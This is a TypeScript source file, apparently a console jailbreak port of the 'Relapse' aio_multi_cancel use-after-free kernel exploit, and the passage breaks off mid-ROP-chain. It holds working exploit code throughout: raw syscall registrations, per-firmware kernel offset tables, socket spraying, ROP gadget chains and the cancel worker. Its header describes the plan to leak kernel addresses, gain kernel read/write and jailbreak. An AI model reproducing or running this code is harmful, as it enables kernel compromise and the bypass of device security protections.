// Relapse/663 (aio-multi-cancel UAF) kernel exploit — Vue port of polpNO.
//
// Scope: Fuentes de tablas: 13.00 / 13.02 / 13.04 (idt anchor + oid sysctl grep'd
// from jb-polpno.js + ps4-offsets reference; corroboration: 13.02/13.04 inherit
// from 13.00 table at identical low-text). 12.50/12.52 belong to netctrl (poops):
// no public relapse table exists for them, relapse() refuses there cleanly.
//
// Self-completion model (netctrl-style): this chain ends calling
// show_success() + run_binloader() itself. The loader does NOT wait for us
// (relapse must be removed from loader's wait/busy-wait conditions).
//
// Flow: relapse_setup (pin main core, scratch page, arenas, socket pool,
// blocking-AIO saturate, cancel worker via thr_new kernel thread) →
// relapse_arm (chunked lkNodes build + armOnce) → relapse_leak (chunked spin,
// owner-stamp → CT1 curthread leak) → relapse_reap → relapse_pass (passA/passB
// decrement oracle → UCRED) → relapse_anchor (IDT sweep → KBASE) →
// relapse_rw (caps + KRW sysctl-oid window → kernel.read_buffer/write_buffer)
// → relapse_jailbreak (curproc/allproc + jailbreak_shared + binloader).
//
// Tunables via CONFIG: relapse_n, relapse_ka, relapse_spray, relapse_spin,
// relapse_spin_chunk, relapse_towait, relapse_sweep, relapse_onum, relapse_retries.

import { fn, BigInt, utils, gadgets, syscalls } from 'download0/types'
import { libc_addr } from 'download0/userland'
import { get_fwversion, hex, malloc, read8, read32, read64, write16, write32, write64, write8, get_kernel_offset, kernel, jailbreak_shared } from 'download0/kernel'
import { show_success, run_binloader } from 'download0/loader'

if (typeof libc_addr === 'undefined') {
  include('userland.js')
}
include('kernel.js')
include('binloader.js')
if (!String.prototype.padStart) {
  String.prototype.padStart = function padStart (targetLength, padString) {
    targetLength = targetLength >> 0
    padString = String(typeof padString !== 'undefined' ? padString : ' ')
    if (this.length > targetLength) {
      return String(this)
    } else {
      targetLength = targetLength - this.length
      if (targetLength > padString.length) {
        padString += padString.repeat(targetLength / padString.length)
      }
      return padString.slice(0, targetLength) + String(this)
    }
  }
}

// ---------------------------------------------------------------------------
// Syscalls (fn.register overwrites safely; lapse/netctrl may have set some)
// ---------------------------------------------------------------------------
fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint')
const read = fn.read
fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint')
const write = fn.write
fn.register(0x06, 'close', ['bigint'], 'bigint')
const close = fn.close
fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint')
const socket = fn.socket
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint')
const socketpair = fn.socketpair
fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint')
const getsockopt = fn.getsockopt
fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint')
const setsockopt = fn.setsockopt
fn.register(20, 'getpid', [], 'bigint')
const getpid = fn.getpid
fn.register(0x18, 'getuid', [], 'bigint')
const getuid = fn.getuid
fn.register(477, 'mmap', ['bigint', 'number', 'number', 'number', 'bigint', 'number'], 'bigint')
const mmap = fn.mmap
fn.register(0x49, 'munmap', ['bigint', 'number'], 'bigint')
const munmap = fn.munmap
fn.register(0xCA, 'sysctl', ['bigint', 'number', 'bigint', 'bigint', 'bigint', 'number'], 'bigint')
const sysctl = fn.sysctl
fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
const cpuset_getaffinity = fn.cpuset_getaffinity
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
const cpuset_setaffinity = fn.cpuset_setaffinity
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint')
const rtprio_thread = fn.rtprio_thread
fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint')
const thr_new = fn.thr_new
fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint')
const nanosleep = fn.nanosleep

fn.register(0x296, 'aio_multi_delete', ['bigint', 'number', 'bigint'], 'bigint')
const aio_multi_delete = fn.aio_multi_delete
fn.register(0x297, 'aio_multi_wait', ['bigint', 'number', 'bigint', 'number', 'bigint'], 'bigint')
const aio_multi_wait = fn.aio_multi_wait
fn.register(0x298, 'aio_multi_poll', ['bigint', 'number', 'bigint'], 'bigint')
const aio_multi_poll = fn.aio_multi_poll
fn.register(0x29A, 'aio_multi_cancel', ['bigint', 'number', 'bigint'], 'bigint')
const aio_multi_cancel = fn.aio_multi_cancel
fn.register(0x29D, 'aio_submit_cmd', ['number', 'bigint', 'number', 'number', 'bigint'], 'bigint')
const aio_submit_cmd = fn.aio_submit_cmd

// Worker-ROP syscall wrappers (libkernel addresses from the syscall map)
const read_wrapper = syscalls.map.get(0x03)!
const cpuset_setaffinity_wrapper = syscalls.map.get(0x1E8)!
const rtprio_thread_wrapper = syscalls.map.get(0x1D2)!
const aio_multi_cancel_wrapper = syscalls.map.get(0x29A)!

fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint')
const setjmp = fn.setjmp
const longjmp_addr = libc_addr.add(0x6CA50)

const BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF)
const BigInt_Zero = new BigInt(0, 0)
const BigInt_Fd = new BigInt(-1) // fd = -1 for mmap

// ---------------------------------------------------------------------------
// Tunables + per-FW relapse kernel table
// ---------------------------------------------------------------------------
function rcfg (key: string, def: number): number {
  const c = (typeof CONFIG !== 'undefined' ? CONFIG : null) as Record<string, unknown> | null
  const v = c ? c['relapse_' + key] : undefined
  return typeof v === 'number' ? v : def
}

const NODE_SZ = 0x38
const SPRAY = rcfg('spray', 512)
const SPIN = rcfg('spin', 40000000)
const SPIN_CHUNK = rcfg('spin_chunk', 2000000)
const WARMUP = 200000
const TOWAIT = rcfg('towait', 1000)
const SWEEP = rcfg('sweep', 256)
const DEBUG_F = rcfg('debug_f', 0)
const ONUM_N = rcfg('onum', 64)
const KA = rcfg('ka', 32768)
const MAX_RETRIES = rcfg('retries', 3)

const PAIR = 0x10001 // STEP_MAG + 1
const KB = PAIR
const MAXN = 2 * KA + KB + 16
const STEP_OFF = 2
const TD_UCRED_OFF = 0x130
const TD_PROC = 0x08

const IDT = new BigInt(0xffffff80, 0x00001a00)
const GATE_SZ = 16
const RELAPSE_STEPMAG = 0x1000000

// Per-FW relapse kernel table (reference: jb-polpno.js / ps4-offsets).
//
// 12.50/12.52 provenance (UNTESTED-on-hardware, first public relapse support):
// allproc/rootvnode/prison0/sysent cross-validated identical 12.50<->13.00
// (OSM-Made fw1250 yaml <-> ps4hen-1300.c <-> Al-Azif 1250 kpatch), so oids and
// arg1s are assumed equal to 13.00. idt_rsvd is unmeasured between medidos
// vecinos 12.00=0x1c1d00 and 13.00=0x1c1d40: primary uses 0x1c1d00 and the
// benign-retry path swaps to 0x1c1d40 (IDT-ALT) before final fallback to
// netctrl (poops), which is proven on 12.50/12.52.
const RELAPSE_K: Record<string, { idt_rsvd: number, oid_kern_file: number, oid_maxfilesperproc: number, oid_maxprocperuid: number, oid_maxfiles: number, arg1_maxfilesperproc: number, arg1_maxprocperuid: number, arg1_maxfiles: number }> = {
  '12.50': { idt_rsvd: 0x1c1d00, oid_kern_file: 0x1a2f8a0, oid_maxfilesperproc: 0x1a2f950, oid_maxprocperuid: 0x1a3ba88, oid_maxfiles: 0x1a2f9a8, arg1_maxfilesperproc: 0x22cc47c, arg1_maxprocperuid: 0x22cc478, arg1_maxfiles: 0x22cc474 },
  '12.52': { idt_rsvd: 0x1c1d00, oid_kern_file: 0x1a2f8a0, oid_maxfilesperproc: 0x1a2f950, oid_maxprocperuid: 0x1a3ba88, oid_maxfiles: 0x1a2f9a8, arg1_maxfilesperproc: 0x22cc47c, arg1_maxprocperuid: 0x22cc478, arg1_maxfiles: 0x22cc474 },
  '13.00': { idt_rsvd: 0x1c1d40, oid_kern_file: 0x1a2f8a0, oid_maxfilesperproc: 0x1a2f950, oid_maxprocperuid: 0x1a3ba88, oid_maxfiles: 0x1a2f9a8, arg1_maxfilesperproc: 0x22cc47c, arg1_maxprocperuid: 0x22cc478, arg1_maxfiles: 0x22cc474 },
  '13.02': { idt_rsvd: 0x1c1d50, oid_kern_file: 0x1a2f8a0, oid_maxfilesperproc: 0x1a2f950, oid_maxprocperuid: 0x1a3ba88, oid_maxfiles: 0x1a2f9a8, arg1_maxfilesperproc: 0x22cc47c, arg1_maxprocperuid: 0x22cc478, arg1_maxfiles: 0x22cc474 },
  '13.04': { idt_rsvd: 0x1c1d50, oid_kern_file: 0x1a2f8a0, oid_maxfilesperproc: 0x1a2f950, oid_maxprocperuid: 0x1a3ba88, oid_maxfiles: 0x1a2f9a8, arg1_maxfilesperproc: 0x22cc47c, arg1_maxprocperuid: 0x22cc478, arg1_maxfiles: 0x22cc474 },
}

const IPV6_TCLASS = 61
const KF_MARK = 0x41
const KERN_FILE_NUM = 15
const KF_BYTES = 1 << 20
const IPPROTO_IPV6 = 41
const IPV6_RTHDR = 51
const AF_INET6 = 28
const SOCK_DGRAM = 2
const AF_UNIX = 1
const SOCK_STREAM = 1
const RTH_SIZE = 0x48
const RTH_LEN = 8
const RTH_SEGLEFT = 4
const SCRATCH_PAGE = 0x04000000
const NODE0_DEC = 0x04000800
const CPU_LEVEL_WHICH = 3
const CPU_WHICH_TID = 1
const PRI_REALTIME = 2
const RTP_SET = 1
const MAIN_RTPRIO = 0x100

// ---------------------------------------------------------------------------
// Telemetry
// ---------------------------------------------------------------------------
function mark (tag: string, detail?: string) {
  const msg = detail ? '[relapse:' + tag + '] ' + detail : '[relapse:' + tag + ']'
  // feed the loader watchdog: any mark proves the chain is alive
  try { jsmaf.relapse_activity = Date.now() } catch (e) { /* optional */ }
  try { jsmaf.relapse_phase = tag } catch (e) { /* optional */ }
  log(msg)
  try {
    const w = (typeof ws !== 'undefined' ? ws : null) as unknown as Record<string, unknown>
    if (w && typeof w.broadcast === 'function') {
      (w.broadcast as (m: string) => void)(msg)
    }
  } catch (e) { /* ws optional */ }
}

function check (name: string, ok: boolean, detail?: string) {
  mark(ok ? 'PROOF-OK' : 'PROOF-FAIL', name + (detail ? '  ' + detail : ''))
  return ok
}

function trace (tag: string, detail?: string) {
  mark(tag, detail)
}

// ---------------------------------------------------------------------------
// Sweep bitmasks (replaces per-candidate string pattern building)
// ---------------------------------------------------------------------------
const DMW = (SWEEP + 31) >> 5
const DM_OBS = new Int32Array(DMW)
const DM_PAT = new Int32Array(DMW)

function dm_zeroObs () {
  DM_OBS.fill(0)
}

function dm_pattern (bv: number, low: number) {
  for (let wi = 0; wi < DMW; wi++) DM_PAT[wi] = 0
  let w = (((bv << 24) >>> 0) | (low & 0xffffff)) | 0
  let bits = 0
  for (let k = 0; k < SWEEP; k++) {
    w = (w - RELAPSE_STEPMAG) | 0
    w = (w - 1) | 0
    bits = ((bits << 1) | (w <= 0 ? 1 : 0)) | 0
    if ((k & 31) === 31) {
      DM_PAT[k >> 5] = bits
      bits = 0
    }
  }
  if ((SWEEP & 31) !== 0) DM_PAT[SWEEP >> 5] = bits
}

function dm_eq () {
  for (let wi = 0; wi < DMW; wi++) {
    if (DM_OBS[wi] !== DM_PAT[wi]) return false
  }
  return true
}

function dm_decode (low: number): { b: number, n: number } {
  let hit = -1
  let n = 0
  for (let bv = 0; bv < 256; bv++) {
    dm_pattern(bv, low)
    if (dm_eq()) {
      if (hit < 0) hit = bv
      n++
    }
  }
  return { b: hit, n }
}

function yield_to_render (callback: () => void) {
  const id = jsmaf.setInterval(function () {
    jsmaf.clearInterval(id)
    try {
      callback()
    } catch (e) {
      relapse_fail('unhandled: ' + (e as Error).message, false)
    }
  }, 0)
}

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
const keepAlive: ArrayBuffer[] = []
const opened: number[] = []
const POOL: number[] = []
let kfSock = -1

let relapse_tries = 0
let armCount = 0
let reapedGen = -1
let relapse_dead = false
let thread_once_done = false
let scratch_mapped = false

let FW_VERSION: string | null = null
let K_TABLE: { idt_rsvd: number, oid_kern_file: number, oid_maxfilesperproc: number, oid_maxprocperuid: number, oid_maxfiles: number, arg1_maxfilesperproc: number, arg1_maxprocperuid: number, arg1_maxfiles: number } | null = null
let idt_alt: number | null = null

let saved_fpu_ctrl = 0
let saved_mxcsr = 0

let CORES: number[] = []
let PINCORE = -1
let OTHER = -1
let pinRestore: (() => void) | null = null

let mAb: ArrayBuffer, mU32: Uint32Array, mU8: Uint8Array, M_AD: BigInt
const OWNER_LO = 6
const OWNER_HI = 7

let lkAb: ArrayBuffer, lkDv: DataView, lkNad: BigInt
let LX: BigInt
let LC: BigInt
const N_LEAK = rcfg('n', 262144)

let arAb: ArrayBuffer, arDv: DataView, arAd: BigInt
let anAb: ArrayBuffer, anDv: DataView, anAd: BigInt

// arming kit
let pAb: ArrayBuffer, pDv: DataView, pAd: BigInt
let rqAb: ArrayBuffer, rqDv: DataView, rqAd: BigInt
let rbAb: ArrayBuffer, rbAd: BigInt
let idAb2: ArrayBuffer, idDv2: DataView, idAd2: BigInt
let stAb2: ArrayBuffer, stDv2: DataView, stAd2: BigInt
let toAb: ArrayBuffer, toDv: DataView, toAd: BigInt
let bspAb: ArrayBuffer, bspDv: DataView, bspAd: BigInt
let bsp0 = -1
let bsp1 = -1
let brbAb: ArrayBuffer, brbAd: BigInt
let brqAb: ArrayBuffer, brqDv: DataView
let bidAb: ArrayBuffer, bidDv: DataView
const NBLOCK = rcfg('bkw', 8)

let spAb: ArrayBuffer, spDv: DataView, spAd: BigInt
let sp0 = -1
let sp1 = -1
let lkAb2: ArrayBuffer, lkDv2: DataView, lkAd2: BigInt // leak-side lk region (counters)
let dumAb: ArrayBuffer, dumDv: DataView, dumAd: BigInt
let DUM: BigInt
let snkAb: ArrayBuffer, snkDv: DataView, snkAd: BigInt
let SNK: BigInt
const N0SINK_OFF = 0x20
let gfAb: ArrayBuffer, gfDv: DataView, gfAd: BigInt
let glAb: ArrayBuffer, glDv: DataView, glAd: BigInt
let mibAb: ArrayBuffer, mibDv: DataView, mibAd: BigInt
let olAb: ArrayBuffer, olDv: DataView, olAd: BigInt

// worker plumbing
let pipe_0 = -1 // read end (worker blocks in read)
let pipe_1 = -1 // write end (main fires)
let sigAb: ArrayBuffer
let readyAb: ArrayBuffer, readyAd: BigInt
let doneAb: ArrayBuffer, doneAd: BigInt
let spawn_thr_args: BigInt
let spawn_tid: BigInt
let spawn_cpid: BigInt
let WORKER_CORE = 4
const WORKER_RTPRIO = 0x100

// threading state
let jmpbuf_main: ArrayBuffer
let jmpbuf_main_dv: DataView

// leaked / derived addresses
let CT1: BigInt | null = null
let UCRED: BigInt | null = null
let KBASE: BigInt | null = null
let CAPS_B: BigInt | null = null
let CAPS_PR: BigInt | null = null
let capsPend = 0

// KEX Konstants (passA/passB)
const B: Record<string, number> = {}

// ---------------------------------------------------------------------------
// Buffer helpers (memcpy-view based, polpNO-compatible)
// ---------------------------------------------------------------------------
function bufAddr (ab: ArrayBuffer): BigInt {
  return utils.get_backing(new Uint8Array(ab))
}

function fdOf (b: BigInt): number {
  return Number(b.lo) | 0
}

function put64 (dv: DataView, at: number, v: BigInt) {
  dv.setUint32(at, v.lo >>> 0, true)
  dv.setUint32(at + 4, v.hi >>> 0, true)
}

function putN (dv: DataView, at: number, v: number) {
  dv.setUint32(at, v >>> 0, true)
  dv.setUint32(at + 4, v < 0 ? 0xFFFFFFFF : 0, true)
}

function buf (bytes: number): { ab: ArrayBuffer, dv: DataView, ad: BigInt } {
  const ab = new ArrayBuffer(bytes)
  keepAlive.push(ab)
  return { ab, dv: new DataView(ab), ad: bufAddr(ab) }
}

// nanosleep test buffer (0.2ms) for polling loops
function nsleep (nsbuf: BigInt) {
  nanosleep(nsbuf)
}

function wait_for (addr: BigInt, target: BigInt, max_tries: number): boolean {
  const nsbuf = buf(0x10)
  for (let i = 0; i < max_tries; i++) {
    if (read64(addr).eq(target)) return true
    nsleep(nsbuf.ad)
  }
  return false
}

function relapse_errno (): number {
  try {
    const f = fn as unknown as Record<string, () => BigInt>
    if (typeof f._error === 'function') {
      const ea = f._error()
      return read32(ea).lo | 0
    }
  } catch (e) { /* fallthrough */ }
  return 0
}

// ---------------------------------------------------------------------------
// Chunk-state for streaming phases
// ---------------------------------------------------------------------------
let lkFillIdx = 0
let spinI = 0
let leakWu = 0
let spinHits = 0
let spinHitLo = 0
let spinHitHi = 0
const spinSamples: string[] = []
const leakFired = false

// ---------------------------------------------------------------------------
// Teardown / retry glue
// ---------------------------------------------------------------------------
function close_fd (fd: number) {
  try {
    if (fd >= 0) close(new BigInt(fd))
  } catch (e) { /* best effort */ }
}

function close_fd_list (fds: number[]) {
  for (const fd of fds) close_fd(fd)
  fds.length = 0
}

function cleanup (final: boolean) {
  mark('CLEANUP', final ? 'final' : 'pre-retry')
  if (pinRestore) {
    try { pinRestore() } catch (e) { /* best effort */ }
    pinRestore = null
  }
  close_fd_list(POOL)
  if (kfSock >= 0) { close_fd(kfSock); kfSock = -1 }
  // NOTE: the cancel worker stays parked on its signal pipe by design
  // (netctrl workers likewise). bsp/sp AIO kernel threads stay blocked:
  // bounded by MAX_RETRIES resubmissions.
}

function relapse_fail (reason: string, benign: boolean) {
  if (relapse_dead) return
  // MAX_RETRIES = total attempts (1 initial + retries); relapse_tries is the
  // attempt that just failed, so a retry is allowed while it fits the budget.
  if (benign && relapse_tries < MAX_RETRIES) {
    relapse_tries++
    // IDT hypothesis swap for 12.50/12.52 after the first benign failure:
    // try the next measured neighbour (0x1c1d40 anchor gate from 13.00)
    if (idt_alt !== null && relapse_tries === 2 && K_TABLE && K_TABLE.idt_rsvd !== idt_alt) {
      K_TABLE = Object.assign({}, K_TABLE, { idt_rsvd: idt_alt })
      mark('IDT-ALT', 'idt_rsvd -> 0x' + (idt_alt as number).toString(16) + ' (13.00 anchor gate)')
    }
    mark('BENIGN-RETRY', reason + ' try=' + relapse_tries + '/' + MAX_RETRIES +
      ' idt=0x' + (K_TABLE ? K_TABLE.idt_rsvd.toString(16) : '?') + ' -> relapse_setup()')
    cleanup(false)
    relapse_setup()
    return
  }
  relapse_dead = true
  cleanup(true)
  mark('FAIL-FINAL', reason + ' (benign=' + (benign ? 1 : 0) + ')')
  try {
    utils.notify('Relapse failed! restart the exploit and try again...')
  } catch (e) { /* notify optional */ }
  // Experimental 12.50/12.52: fall back to netctrl (poops), proven there
  if ((FW_VERSION === '12.50' || FW_VERSION === '12.52') && typeof include === 'function') {
    mark('NETCTRL-FALLBACK', 'relapse exhausted, falling back to netctrl')
    try {
      utils.notify('Trying NetControl fallback...')
      include('netctrl_c0w_twins.js')
    } catch (e) {
      mark('NETCTRL-FALLBACK-FAIL', (e as Error).message)
    }
  }
}

// ---------------------------------------------------------------------------
// Threading init (setjmp once for FPU context) — netctrl init_threading
// ---------------------------------------------------------------------------
function relapse_init_threading () {
  if (thread_once_done) return
  jmpbuf_main = new ArrayBuffer(0x60)
  keepAlive.push(jmpbuf_main)
  jmpbuf_main_dv = new DataView(jmpbuf_main)
  const jmpbuf = bufAddr(jmpbuf_main)
  setjmp(jmpbuf)
  // 0x40 FPU control word, 0x44 MXCSR
  saved_fpu_ctrl = jmpbuf_main_dv.getUint32(0x40, true)
  saved_mxcsr = jmpbuf_main_dv.getUint32(0x44, true)
  if (saved_fpu_ctrl === 0 || saved_mxcsr === 0) {
    mark('PER-SVJ', 'fpu=0x' + saved_fpu_ctrl.toString(16) + ' mxcsr=0x' + saved_mxcsr.toString(16))
  }
  thread_once_done = true
}

// ---------------------------------------------------------------------------
// Core pinning (main -> first available core; worker -> other core)
// ---------------------------------------------------------------------------
function pin_main () {
  const mask0_ab = buf(0x10)
  const mask0 = mask0_ab.ad
  cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, BigInt_Fd, 0x10, mask0)
  const m0 = mask0_ab.dv.getUint32(0, true)
  const m1 = mask0_ab.dv.getUint32(4, true)
  CORES = []
  if (m0 !== 0) {
    for (let b = 0; b < 32; b++) if ((m0 >>> b) & 1) CORES.push(b)
  }
  if (CORES.length === 0 && m1 !== 0) {
    for (let b = 0; b < 32; b++) if ((m1 >>> b) & 1) CORES.push(32 + b)
  }
  if (CORES.length === 0) {
    CORES = [4]
    mark('CORE-LIST', 'no mask, fallback core=4 single')
  } else {
    mark('CORE-LIST', 'available=' + CORES.map(String).join(','))
  }
  const maskedPin = rcfg('pin', 0)
  PINCORE = maskedPin || CORES[0]
  OTHER = CORES.length > 1 ? (PINCORE === CORES[0] ? CORES[CORES.length - 1] : CORES[0]) : PINCORE

  // pin the main thread to PINCORE
  const cm = buf(0x10)
  const msk = cm.ad
  if (PINCORE < 32) cm.dv.setUint32(0, 1 << PINCORE, true)
  else cm.dv.setUint32(4, 1 << (PINCORE - 32), true)
  const setr = cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, BigInt_Fd, 0x10, msk)
  {
    const rb = buf(0x10)
    cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, BigInt_Fd, 0x10, rb.ad)
    const rm = rb.dv.getUint32(0, true)
    const want = PINCORE < 32 ? (1 << PINCORE) : 0
    const got = PINCORE < 32 ? rm : rb.dv.getUint32(4, true)
    check('MAIN-PINNED', setr.eq(BigInt_Zero) && want === got, 'core=' + PINCORE + ' back=0x' + (got >>> 0).toString(16))
  }
  pinRestore = function () {
    try {
      const rb = buf(0x10)
      rb.dv.setUint32(0, m0, true)
      rb.dv.setUint32(4, m1, true)
      cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, BigInt_Fd, 0x10, rb.ad)
    } catch (e) { /* best effort */ }
  }
}

// ---------------------------------------------------------------------------
// Scratch page mmap + node0 sanity via socket rthdr copy
// ---------------------------------------------------------------------------
function mmap_scratch () {
  if (scratch_mapped) return
  mmap(new BigInt(SCRATCH_PAGE), 0x10000, 3 /* PROT_RW */, 0x1012 /* PRIVATE|FIXED|ANON */, BigInt_Fd, 0)
  scratch_mapped = true

  // Verify the fixed page actually landed: rthdr setsockopt/getsockopt probe.
  const tAb = buf(RTH_SIZE)
  tAb.dv.setUint8(1, RTH_LEN)
  tAb.dv.setUint8(3, RTH_SEGLEFT)
  const vsTmp = socket(AF_INET6, SOCK_DGRAM, 0)
  const vs = fdOf(vsTmp)
  opened.push(vs)
  const s1 = setsockopt(vs, IPPROTO_IPV6, IPV6_RTHDR, bufAddr(tAb.ab), RTH_SIZE)
  const RTs = new BigInt(SCRATCH_PAGE + 0x2000)
  const lenAb = buf(8)
  lenAb.dv.setUint32(0, RTH_SIZE, true)
  lenAb.dv.setUint32(4, 0, true)
  const g1 = getsockopt(vs, IPPROTO_IPV6, IPV6_RTHDR, RTs, lenAb.ad)
  const s2 = setsockopt(vs, IPPROTO_IPV6, IPV6_RTHDR, RTs, RTH_SIZE)
  close_fd(vs)
  opened.pop()
  check('SCRATCH-MAPPED', fdOf(g1) === 0 && fdOf(s2) === 0 && fdOf(s1) === 0, 'get/set rthdr via mmap@0x4000000')
}

// ---------------------------------------------------------------------------
// Arenas (large ArrayBuffers + cached views)
// ---------------------------------------------------------------------------
function alloc_arenas () {
  if (lkAb) return
  const memFree = rcfg('reserve', 0)
  lkAb = new ArrayBuffer(NODE_SZ * N_LEAK)
  keepAlive.push(lkAb)
  lkDv = new DataView(lkAb)
  lkNad = bufAddr(lkAb)

  arAb = new ArrayBuffer(NODE_SZ * MAXN)
  keepAlive.push(arAb)
  arDv = new DataView(arAb)
  arAd = bufAddr(arAb)

  mAb = new ArrayBuffer(0x40)
  keepAlive.push(mAb)
  mU32 = new Uint32Array(mAb)
  mU8 = new Uint8Array(mAb)
  M_AD = bufAddr(mAb)

  anAb = new ArrayBuffer(4 * 8 * SWEEP)
  keepAlive.push(anAb)
  anDv = new DataView(anAb)
  anAd = bufAddr(anAb)

  mark('PR-ARENAS', 'lk=0x' + (NODE_SZ * N_LEAK).toString(16) + ' ar=0x' + (NODE_SZ * MAXN).toString(16) + reserved(memFree))
}
function reserved (n: number) {
  return n > 0 ? ' reserved=' + n : ''
}

// ---------------------------------------------------------------------------
// Arming kit (AIO request buffers + sockets)
// ---------------------------------------------------------------------------
function mk_arming_buffers () {
  const pAb_lst = buf(RTH_SIZE)
  pAb = pAb_lst.ab
  pDv = pAb_lst.dv
  pAd = pAb_lst.ad

  // main socket pair + 2 read AIO requests (rqAb: 2 * 0x28 each)
  const spLst = buf(8)
  spAb = spLst.ab
  spDv = spLst.dv
  spAd = spLst.ad
  socketpair(AF_UNIX, SOCK_STREAM, 0, spAd)
  sp0 = spDv.getInt32(0, true)
  sp1 = spDv.getInt32(4, true)
  opened.push(sp0, sp1)
  trace('PR-MAIN-PAIR', 'sp=' + sp0 + '/' + sp1)

  rbAd = buf(0x40).ad
  rqAd_new()
  idAb2 = new ArrayBuffer(8)
  keepAlive.push(idAb2)
  idDv2 = new DataView(idAb2)
  idAd2 = bufAddr(idAb2)
  const stLst = buf(8)
  stAb2 = stLst.ab
  stDv2 = stLst.dv
  stAd2 = stLst.ad
  const toLst = buf(8)
  toAb = toLst.ab
  toDv = toLst.dv
  toAd = toLst.ad
  toDv.setUint32(0, TOWAIT, true)
  toDv.setUint32(4, 0, true)

  // blocking socket pair + NBLOCK blocking read requests (saturate AIO threads)
  const bspLst = buf(8)
  bspAb = bspLst.ab
  bspDv = bspLst.dv
  bspAd = bspLst.ad
  socketpair(AF_UNIX, SOCK_STREAM, 0, bspAd)
  bsp0 = bspDv.getInt32(0, true)
  bsp1 = bspDv.getInt32(4, true)
  opened.push(bsp0, bsp1)

  brbAb = new ArrayBuffer(0x40)
  keepAlive.push(brbAb)
  brbAd = bufAddr(brbAb)
  brqAb = new ArrayBuffer(NBLOCK * 0x28)
  keepAlive.push(brqAb)
  brqDv = new DataView(brqAb)
  bidAb = new ArrayBuffer(NBLOCK * 4)
  keepAlive.push(bidAb)
  bidDv = new DataView(bidAb)
}

function rqAd_new () {
  rqAb = new ArrayBuffer(0x50)
  keepAlive.push(rqAb)
  rqDv = new DataView(rqAb)
  rqAd = bufAddr(rqAb)
  // req 0: read(sp0) len=0x40 buf=rbAd
  putN(rqDv, 0x00, 0)
  putN(rqDv, 0x08, 0x40)
  put64(rqDv, 0x10, rbAd)
  putN(rqDv, 0x20, sp0)
  // req 1: read(sp0) len=0x40 buf=rbAd (same wb target, both from sp0)
  putN(rqDv, 0x28, 0)
  putN(rqDv, 0x30, 0x40)
  put64(rqDv, 0x38, rbAd)
  putN(rqDv, 0x48, sp0)
}

function mSaturate () {
  for (let b = 0; b < NBLOCK; b++) {
    const o = b * 0x28
    putN(brqDv, o + 0x00, 0)
    putN(brqDv, o + 0x08, 0x40)
    put64(brqDv, o + 0x10, brbAd)
    putN(brqDv, o + 0x20, bsp0)
  }
  // mark BEFORE the blocking submit: if the kernel hangs inside
  // aio_submit_cmd on a given fw, this is the last visible line
  mark('PR-SATURATE-ENTER', 'aio_submit_cmd blocking=' + NBLOCK + ' prio=3')
  const rs0 = aio_submit_cmd(1 | 0x1000, bufAddr(brqAb), NBLOCK, 3, bufAddr(bidAb))
  trace('PR-SATURATE', 'blocking_submitted=' + NBLOCK + ' rs=' + Number(rs0.lo))
  mark('PR-SATURATE', 'blocking=' + NBLOCK + ' prio=3 state=SUBMITTED')
}

function pool_create () {
  for (let i = 0; i < SPRAY; i++) {
    const fd = fdOf(socket(AF_INET6, SOCK_DGRAM, 0))
    if (fd < 0) break
    POOL.push(fd)
    opened.push(fd)
  }
  mark('PR-POOL', 'reclaim sockets=' + POOL.length)
}

// ---------------------------------------------------------------------------
// Cancel worker (kernel thread via thr_new, parked on a signal pipe)
// ---------------------------------------------------------------------------
function cancel_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
  const rop: BigInt[] = []
  rop.push(new BigInt(0)) // first element overwritten by longjmp

  const cpu_mask = malloc(0x10)
  write16(cpu_mask, 1 << WORKER_CORE)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(CPU_LEVEL_WHICH))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(CPU_WHICH_TID))
  rop.push(gadgets.POP_RDX_RET)
  rop.push(BigInt_Error)
  rop.push(gadgets.POP_RCX_RET)
  rop.push(new BigInt(0x10))
  rop.push(gadgets.POP_R8_RET)
  rop.push(cpu_mask)
  rop.push(cpuset_setaffinity_wrapper)

  const rtprio_buf = malloc(4)
  write16(rtprio_buf, PRI_REALTIME)
  write16(rtprio_buf.add(2), WORKER_RTPRIO)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(RTP_SET))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(0))
  rop.push(gadgets.POP_RDX_RET)
  rop.push(rtprio_buf)
  rop.push(rtprio_thread_wrapper)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(ready_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_init = rop.length
  // read(pipe_0, signal_buf, 1) — blocks here between fires
  rop.push(gadgets.POP_RDI_RET)
  rop.push(run_fd)
  rop.push(gadgets.POP_RSI_RET)
  rop.push(signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(1))
  rop.push(read_wrapper)
  // aio_multi_cancel(idAd2, 1, stAd2) — the relapse step
  rop.push(gadgets.POP_RDI_RET)
  rop.push(idAd2)
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.POP_RDX_RET)
  rop.push(stAd2)
  rop.push(aio_multi_cancel_wrapper)
  // signal done
